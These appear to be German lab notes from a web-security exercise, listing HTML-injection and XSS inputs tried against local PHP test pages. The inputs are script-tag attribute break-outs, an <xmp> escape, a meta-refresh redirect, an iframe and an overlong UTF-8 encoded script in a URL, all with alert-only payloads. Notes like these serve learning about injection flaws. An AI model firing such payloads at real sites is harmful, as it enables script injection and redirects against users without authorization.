## 6.1.1.1 - 1.php
### Schreibe deinen Namen in Italic
Einfach `<i>Ertugrul</i>` in die Box eingeben!

### Namen in anderer Schriftart anzeigen
```html
<span style="color: red">Ertugrul</span>
```

### Schreibe deinen Namen in weiß
```html
<span style="color: white">Ertugrul</span>
```

### Ändere die Background Color zu blau
```html
<style>body {background-color: blue;}</style>
```

### Füge ein weiteres Feld ein
```html
Ertugrul<br><input />
```


## 6.1.1.2 - 2.php
## Versuche eine Injection
```html
myname"/><script>alert('hey')</script><span class="
```

## 6.1.1.3 - Zurück zu 1.php
### Versuche eine Weiterleitung mittels Meta Tag
```html
<meta http-equiv="refresh" content="0; URL=http://google.de/">
```

### Versuche einen IFrame einzubinden
```html
<iframe src="2.php" height="200" width="300" title="Iframe Example"></iframe>
```

## 6.1.1.4 - 4.php
### Versuche eine Injection
```html
<xmp></xmp><script>alert("Hello world");</script><xmp>
```

## 6.1.1.5 - 5.php
### Versuche einen Overlong UTF-8 Character (2 Bytes statt 1) zu injezieren
```html
http://192.168.178.93/html/4.php?name=%C0%BCscript%C0%BEalert("hi")%C0%BC/script%C0%BE
```

```ad-note
Achtung: Dies klappt mit neuen Browsern nicht!
```